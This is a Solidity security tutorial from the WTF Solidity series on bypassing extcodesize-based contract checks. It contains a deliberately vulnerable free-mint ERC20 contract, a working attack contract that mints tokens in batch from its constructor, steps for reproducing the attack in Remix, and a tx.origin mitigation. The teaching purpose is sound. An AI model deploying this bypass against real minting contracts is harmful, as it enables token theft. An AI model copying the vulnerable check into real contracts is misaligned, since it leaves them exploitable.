---
title: S08. Contract Check Bypassing
tags:
    - solidity
    - security
    - constructor
---

# WTF Solidity S08. Contract Length Check Bypassing

Recently, I have been revisiting Solidity, consolidating the finer details, and writing "WTF Solidity" tutorials for newbies. 

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy_](https://twitter.com/WTFAcademy_)

Community: [Discord](https://discord.gg/5akcruXrsk)｜[Wechat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[Website wtf.academy](https://wtf.academy)

Codes and tutorials are open source on GitHub: [github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

English translations by: [@to_22X](https://twitter.com/to_22X)

-----

In this lesson, we will discuss contract length checks bypassing and introduce how to prevent it.

## Bypassing Contract Check

Many free-mint projects use the `isContract()` method to restrict programmers/hackers and limit the caller `msg.sender` to external accounts (EOA) rather than contracts. This function uses `extcodesize` to retrieve the bytecode length (runtime) stored at the address. If the length is greater than 0, it is considered a contract; otherwise, it is an EOA (user).

```solidity
    // Use extcodesize to check if it's a contract
    function isContract(address account) public view returns (bool) {
        // Addresses with extcodesize > 0 are definitely contract addresses
        // However, during contract construction, extcodesize is 0
        uint size;
        assembly {
          size := extcodesize(account)
        }
        return size > 0;
    }
```

Here is a vulnerability where the `runtime bytecode` is not yet stored at the address when the contract is being created, so the `bytecode` length is 0. This means that if we write the logic in the constructor of the contract, we can bypass the `isContract()` check.

![](./img/S08-1.png)

## Vulnerability Example

Let's take a look at an example: The `ContractCheck` contract is a free-mint ERC20 contract, and the `mint()` function uses the `isContract()` function to prevent calls from contract addresses, preventing hackers from minting tokens in batch. Each call to `mint()` can mint 100 tokens.

```solidity
// Check if an address is a contract using extcodesize
contract ContractCheck is ERC20 {
    // Constructor: Initialize token name and symbol
    constructor() ERC20("", "") {}
    
    // Use extcodesize to check if it's a contract
    function isContract(address account) public view returns (bool) {
        // Addresses with extcodesize > 0 are definitely contract addresses
        // However, during contract construction, extcodesize is 0
        uint size;
        assembly {
          size := extcodesize(account)
        }
        return size > 0;
    }

    // mint function, only callable by non-contract addresses (vulnerable)
    function mint() public {
        require(!isContract(msg.sender), "Contract not allowed!");
        _mint(msg.sender, 100);
    }
}
```

We will write an attack contract that calls the `mint()` function multiple times in the `constructor` to mint `1000` tokens in batch:

```solidity
// Attack using constructor's behavior
contract NotContract {
    bool public isContract;
    address public contractCheck;

    // When the contract is being created, extcodesize (code length) is 0, so it won't be detected by isContract().
    constructor(address addr) {
        contractCheck = addr;
        isContract = ContractCheck(addr).isContract(address(this));
        // This will work
        for(uint i; i < 10; i++){
            ContractCheck(addr).mint();
        }
    }

    // After the contract is created, extcodesize > 0, isContract() can detect it
    function mint() external {
        ContractCheck(contractCheck).mint();
    }
}
```

If what we mentioned earlier is correct, calling `mint()` in the constructor can bypass the `isContract()` check and successfully mint tokens. In this case, the function will be deployed successfully and the state variable `isContract` will be assigned `false` in the constructor. However, after the contract is deployed, the runtime bytecode is stored at the contract address, `extcodesize > 0`, and `isContract()` can successfully prevent minting, causing the `mint()` function to fail.

## Reproduce on `Remix`

1. Deploy the `ContractCheck` contract.

2. Deploy the `NotContract` contract with the `ContractCheck` contract address as the parameter.

3. Call the `balanceOf` function of the `ContractCheck` contract to check that the token balance of the `NotContract` contract is `1000`, indicating a successful attack.

4. Call the `mint()` function of the `NotContract` contract. Since the contract has already been deployed, calling the `mint()` function will fail.

## How to Prevent

You can use `(tx.origin == msg.sender)` to check if the caller is a contract. If the caller is an EOA, `tx.origin` and `msg.sender` will be equal; if they are not equal, the caller is a contract.

```
function realContract(address account) public view returns (bool) {
    return (tx.origin == msg.sender);
}
```

## Summary

In this lecture, we introduced a vulnerability where the contract length check can be bypassed, and we discussed methods to prevent it. If the `extcodesize` of an address is greater than 0, then the address is definitely a contract. However, if `extcodesize` is 0, the address could be either an externally owned account (`EOA`) or a contract in the process of being created.